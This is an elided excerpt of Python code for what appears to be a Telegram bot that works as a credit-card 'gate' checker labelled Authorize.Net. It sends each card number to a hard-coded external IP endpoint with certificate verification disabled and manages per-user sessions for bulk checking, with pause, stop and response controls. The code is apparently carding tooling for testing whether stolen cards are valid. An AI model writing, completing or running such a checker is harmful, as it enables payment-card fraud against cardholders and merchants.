...
GATE_NAME = "Authorize.Net"
GATE_CMD = "mat"
MAT_API = "http://5.83.136.66:8008/authnet?cc={cc}"
active_sessions = {}
...
def process_single_card(card):
    try:
        resp = requests.get(MAT_API.format(cc=card), timeout=90, verify=False)
        if resp.status_code == 200:
            data = resp.json()
...
async def mat_command(message: types.Message):
...
@router.callback_query(F.data.startswith("mat_card_"))
async def mat_card_callback(callback: types.CallbackQuery):
...
@router.callback_query(F.data.startswith("mat_response_"))
async def mat_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mat_stop_"))
async def mat_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mat_pause_"))
async def mat_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
